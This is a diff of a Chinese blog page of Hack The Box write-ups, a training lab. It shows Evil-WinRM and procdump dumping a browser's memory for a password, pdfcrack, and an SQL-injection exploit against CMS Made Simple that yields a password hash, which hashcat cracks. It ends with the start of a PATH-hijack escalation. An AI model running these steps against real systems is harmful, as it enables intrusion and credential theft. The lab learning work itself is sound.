class="line"></span><br><span class="line">[14:05:23] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.dmp</span><br><span class="line">[14:05:24] Dump 1 writing: Estimated dump file size is 514 MB.</span><br><span class="line">[14:05:25] Dump 1 complete: 514 MB written <span class="keyword">in</span> 1.4 seconds</span><br><span class="line">[14:05:25] Dump count reached.</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 上传procdump</span><br>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; upload /home/tiger/桌面/procdump.exe <br>Info: Uploading /home/tiger/桌面/procdump.exe to C:\Users\Chase\Desktop\procdump.exe<br><br>                                                             <br>Data: 1055944 bytes of 1055944 bytes copied<br><br>Info: Upload successful!<br><br>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; <br><br><span class="hljs-comment"># dump整个内存，-ma参数</span><br>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; .\procdump.exe -accepteula -ma 4288 firefox.dmp <br><br>ProcDump v11.0 - Sysinternals process dump utility<br>Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards<br>Sysinternals - www.sysinternals.com<br><br>[14:05:23] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.dmp<br>[14:05:24] Dump 1 writing: Estimated dump file size is 514 MB.<br>[14:05:25] Dump 1 complete: 514 MB written <span class="hljs-keyword">in</span> 1.4 seconds<br>[14:05:25] Dump count reached.<br></code></pre></td></tr></table></figure>
 
 <p>使用项目：<a target="_blank" rel="noopener" href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a> ，快速开启一个smbserver传递文件</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173242182.png" alt="image-20221127173242182"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173242182.png" srcset="/img/loading.gif" lazyload alt="image-20221127173242182"></p>
 <p>在Windows主机上拷贝文件到共享目录</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173412335.png" alt="image-20221127173412335"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173412335.png" srcset="/img/loading.gif" lazyload alt="image-20221127173412335"></p>
 <p>在前面的80端口，Hazard需要一个账户进行登录，抓一下登录的包</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173645759.png" alt="image-20221127173645759"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173645759.png" srcset="/img/loading.gif" lazyload alt="image-20221127173645759"></p>
 <p>内存搜索，找到了：</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173805961.png" alt="image-20221127173805961"></p>
-<p>使用这组<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#x75;&#x70;&#112;&#111;&#x72;&#x74;&#46;&#104;&#x74;&#98;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#x75;&#x70;&#112;&#111;&#x72;&#x74;&#46;&#104;&#x74;&#98;</a>:4dD!5}x&#x2F;re8]FBuZ，再次进行登录</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127174831192.png" alt="image-20221127174831192"></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127175141688.png" alt="image-20221127175141688"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127173805961.png" srcset="/img/loading.gif" lazyload alt="image-20221127173805961"></p>
+<p>使用这组<a href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#117;&#112;&#x70;&#x6f;&#x72;&#116;&#46;&#104;&#116;&#x62;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#117;&#112;&#x70;&#x6f;&#x72;&#116;&#46;&#104;&#116;&#x62;</a>:4dD!5}x&#x2F;re8]FBuZ，再次进行登录</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127174831192.png" srcset="/img/loading.gif" lazyload alt="image-20221127174831192"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221127175141688.png" srcset="/img/loading.gif" lazyload alt="image-20221127175141688"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
 <li><input disabled type="checkbox"> WinRM</li>
 <li><input disabled type="checkbox"> SMB</li>
 </ul>
 <h2 id="0ld-is-g0ld"><a href="#0ld-is-g0ld" class="headerlink" title="0ld is g0ld"></a>0ld is g0ld</h2><p>打开后，发现一个pdf文件被加密了</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212200510609.png" alt="image-20221212200510609"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212200510609.png" srcset="/img/loading.gif" lazyload alt="image-20221212200510609"></p>
 <p>使用<code>pdfcrack</code>进行暴力破解</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212201916498.png" alt="image-20221212201916498"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212201916498.png" srcset="/img/loading.gif" lazyload alt="image-20221212201916498"></p>
 <p>解密后，图片如下</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203530009.png" alt="image-20221212203530009"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203530009.png" srcset="/img/loading.gif" lazyload alt="image-20221212203530009"></p>
 <p>在线解码</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203850956.png" alt="image-20221212203850956"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212203850956.png" srcset="/img/loading.gif" lazyload alt="image-20221212203850956"></p>
 <h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>从提供的信息来看像是一道Web的靶机</p>
 <h3 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h3><p>使用之前的脚步进行端口扫描</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ ./nmap_scan.sh     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 21:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.138</span><br><span class="line">Host is up (0.097s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp open   ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 <span class="built_in">dd</span>:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)</span><br><span class="line">|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)</span><br><span class="line">|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)</span><br><span class="line">80/tcp closed http</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.59 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box]<br>└─$ ./nmap_scan.sh     <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 21:00 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.138<br>Host is up (0.097s latency).<br><br>PORT   STATE  SERVICE VERSION<br>22/tcp open   ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 <span class="hljs-built_in">dd</span>:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)<br>|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)<br>|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)<br>80/tcp closed http<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.59 seconds<br><br></code></pre></td></tr></table></figure>
 
 <h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>对80端口进行目录扫描：<code>dirsearch</code>（失败）、尝试访问robots.txt</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212213928275.png" alt="image-20221212213928275"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212213928275.png" srcset="/img/loading.gif" lazyload alt="image-20221212213928275"></p>
 <p>访问，看到可能存在的注入点（<code>sqlmap</code>尝试后好像方向不对）</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212215423237.png" alt="image-20221212215423237"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212215423237.png" srcset="/img/loading.gif" lazyload alt="image-20221212215423237"></p>
 <p>查看主页源码，发现了PHP的<code>CMS</code>框架</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212222035320.png" alt="image-20221212222035320"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221212222035320.png" srcset="/img/loading.gif" lazyload alt="image-20221212222035320"></p>
 <p>利用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ searchsploit <span class="string">&quot;CMS Made Simple&quot;</span>                            </span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                              |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                          | php/remote/46627.rb</span><br><span class="line">CMS Made Simple 0.10 - <span class="string">&#x27;index.php&#x27;</span> Cross-Site Scripting                                                                                                                     | php/webapps/26298.txt</span><br><span class="line">CMS Made Simple 0.10 - <span class="string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                                                                                                     | php/webapps/26217.html</span><br><span class="line">CMS Made Simple 1.0.2 - <span class="string">&#x27;SearchInput&#x27;</span> Cross-Site Scripting                                                                                                                  | php/webapps/29272.txt</span><br><span class="line">CMS Made Simple 1.0.5 - <span class="string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                                                                                      | php/webapps/29941.txt</span><br><span class="line">CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                     | php/webapps/32668.txt</span><br><span class="line">CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                           | php/webapps/43889.txt</span><br><span class="line">CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                 | php/webapps/4442.txt</span><br><span class="line">CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                        | php/webapps/4810.txt</span><br><span class="line">CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                            | php/webapps/5600.php</span><br><span class="line">CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                | php/webapps/7285.txt</span><br><span class="line">CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                               | php/webapps/9407.txt</span><br><span class="line">CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                         | php/webapps/33643.txt</span><br><span class="line">CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/11424.txt</span><br><span class="line">CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                            | php/webapps/12009.html</span><br><span class="line">CMS Made Simple 1.8 - <span class="string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                                                                                               | php/webapps/34299.py</span><br><span class="line">CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                     | php/webapps/34068.html</span><br><span class="line">CMS Made Simple 2.1.6 - <span class="string">&#x27;cntnt01detailtemplate&#x27;</span> Server-Side Template Injection                                                                                              | php/webapps/48944.py</span><br><span class="line">CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/41997.txt</span><br><span class="line">CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                               | php/webapps/44192.txt</span><br><span class="line">CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                              | php/webapps/48779.py</span><br><span class="line">CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                | php/webapps/48742.txt</span><br><span class="line">CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                    | php/webapps/48851.txt</span><br><span class="line">CMS Made Simple 2.2.15 - <span class="string">&#x27;title&#x27;</span> Cross-Site Scripting (XSS)                                                                                                                 | php/webapps/49793.txt</span><br><span class="line">CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                | php/webapps/49345.txt</span><br><span class="line">CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                    | php/webapps/49199.txt</span><br><span class="line">CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/44976.py</span><br><span class="line">CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/45793.py</span><br><span class="line">CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                                                                                                             | php/webapps/39760.txt</span><br><span class="line">CMS Made Simple &lt; 2.2.10 - SQL Injection                                                                                                                                    | php/webapps/46635.py</span><br><span class="line">CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                            | php/webapps/34300.py</span><br><span class="line">CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                       | php/webapps/34298.py</span><br><span class="line">CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                              | php/webapps/46546.py</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/hack-the-box]<br>└─$ searchsploit <span class="hljs-string">&quot;CMS Made Simple&quot;</span>                            <br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                              |  Path<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                          | php/remote/46627.rb<br>CMS Made Simple 0.10 - <span class="hljs-string">&#x27;index.php&#x27;</span> Cross-Site Scripting                                                                                                                     | php/webapps/26298.txt<br>CMS Made Simple 0.10 - <span class="hljs-string">&#x27;Lang.php&#x27;</span> Remote File Inclusion                                                                                                                     | php/webapps/26217.html<br>CMS Made Simple 1.0.2 - <span class="hljs-string">&#x27;SearchInput&#x27;</span> Cross-Site Scripting                                                                                                                  | php/webapps/29272.txt<br>CMS Made Simple 1.0.5 - <span class="hljs-string">&#x27;Stylesheet.php&#x27;</span> SQL Injection                                                                                                                      | php/webapps/29941.txt<br>CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                     | php/webapps/32668.txt<br>CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                           | php/webapps/43889.txt<br>CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                 | php/webapps/4442.txt<br>CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                        | php/webapps/4810.txt<br>CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                            | php/webapps/5600.php<br>CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                | php/webapps/7285.txt<br>CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                               | php/webapps/9407.txt<br>CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                         | php/webapps/33643.txt<br>CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/11424.txt<br>CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                            | php/webapps/12009.html<br>CMS Made Simple 1.8 - <span class="hljs-string">&#x27;default_cms_lang&#x27;</span> Local File Inclusion                                                                                                               | php/webapps/34299.py<br>CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                     | php/webapps/34068.html<br>CMS Made Simple 2.1.6 - <span class="hljs-string">&#x27;cntnt01detailtemplate&#x27;</span> Server-Side Template Injection                                                                                              | php/webapps/48944.py<br>CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                            | php/webapps/41997.txt<br>CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                               | php/webapps/44192.txt<br>CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                              | php/webapps/48779.py<br>CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                | php/webapps/48742.txt<br>CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                    | php/webapps/48851.txt<br>CMS Made Simple 2.2.15 - <span class="hljs-string">&#x27;title&#x27;</span> Cross-Site Scripting (XSS)                                                                                                                 | php/webapps/49793.txt<br>CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                | php/webapps/49345.txt<br>CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                    | php/webapps/49199.txt<br>CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/44976.py<br>CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                               | php/webapps/45793.py<br>CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning                                                                                                             | php/webapps/39760.txt<br>CMS Made Simple &lt; 2.2.10 - SQL Injection                                                                                                                                    | php/webapps/46635.py<br>CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                            | php/webapps/34300.py<br>CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                       | php/webapps/34298.py<br>CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                              | php/webapps/46546.py<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br></code></pre></td></tr></table></figure>
 
 <p>使用这一条：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CMS Made Simple &lt; 2.2.10 - SQL Injection | php/webapps/46635.py</span><br><span class="line"></span><br><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ searchsploit -m php/webapps/46635.py</span><br><span class="line">  Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/46635</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line"></span><br><span class="line">Copied to: /home/tiger/桌面/hack-the-box/46635.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">CMS Made Simple &lt; 2.2.10 - SQL Injection | php/webapps/46635.py<br><br>┌──(tiger㉿kali)-[~/桌面/hack-the-box]<br>└─$ searchsploit -m php/webapps/46635.py<br>  Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection<br>      URL: https://www.exploit-db.com/exploits/46635<br>     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/tiger/桌面/hack-the-box/46635.py<br><br></code></pre></td></tr></table></figure>
 
 <p>执行后，得到几个信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Salt <span class="keyword">for</span> password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Salt <span class="hljs-keyword">for</span> password found: 5a599ef579066807<br>[+] Username found: jkr<br>[+] Email found: jkr@writeup.htb<br>[+] Password found: 62def4866937f08cc13bab43bb14e6f7<br><br></code></pre></td></tr></table></figure>
 
 <p>使用hashcat进行破解</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213001822043.png" alt="image-20221213001822043"></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213002229646.png" alt="image-20221213002229646"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213001822043.png" srcset="/img/loading.gif" lazyload alt="image-20221213001822043"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213002229646.png" srcset="/img/loading.gif" lazyload alt="image-20221213002229646"></p>
 <h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>ssh登录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ <span class="built_in">ls</span> ./</span><br><span class="line">user.txt</span><br><span class="line">jkr@writeup:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">13142f5a92b45a42150dfcc445ba1dff</span><br><span class="line">jkr@writeup:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jkr@writeup:~$ <span class="hljs-built_in">ls</span> ./<br>user.txt<br>jkr@writeup:~$ <span class="hljs-built_in">cat</span> user.txt <br>13142f5a92b45a42150dfcc445ba1dff<br>jkr@writeup:~$ <br><br></code></pre></td></tr></table></figure>
 
 <p>使用<code>pspy32</code>监测进程信息</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213011738020.png" alt="image-20221213011738020"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213011738020.png" srcset="/img/loading.gif" lazyload alt="image-20221213011738020"></p>
 <p><strong>关于motd信息</strong></p>
 <blockquote>
 <p><strong>motd</strong>是message of the day的缩写，意思是“当天的提示信息”，通常在用户成功登录到Linux后出现，该信息可以从&#x2F;etc&#x2F;motd文本文件中找到。</p>
 <p>在Ubuntu中有<strong>update-motd</strong>来帮助系统管理员或用户实现这个功能。可执行的脚本位于&#x2F;etc&#x2F;update-motd.d&#x2F;*下，在每次登录时以root身份由pam_motd调用，脚本运行的次序由run-parts（run scripts or programs in a directory，在一个目录里运行脚本或程序）的–lsbsysinit选项决定。pam_motd也支持不动态更新，只需要在其选项中添加noupdate即可。</p>
 </blockquote>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213012124291.png" alt="image-20221213012124291"></p>
-<h4 id="PATH劫持"><a href="#PATH劫持" class="headerlink" title="PATH劫持"></a>PATH劫持</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:/usr/local$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">jkr@writeup:/usr/local$ <span class="built_in">cat</span> /etc/update-motd.d/10-<span class="built_in">uname</span> </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">uname</span> -rnsom</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213012124291.png" srcset="/img/loading.gif" lazyload alt="image-20221213012124291"></p>
+<h4 id="PATH劫持"><a href="#PATH劫持" class="headerlink" title="PATH劫持"></a>PATH劫持</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jkr@writeup:/usr/local$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<br>jkr@writeup:/usr/local$ <span class="hljs-built_in">cat</span> /etc/update-motd.d/10-<span class="hljs-built_in">uname</span> <br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">uname</span> -rnsom<br><br></code></pre></td></tr></table></figure>
 
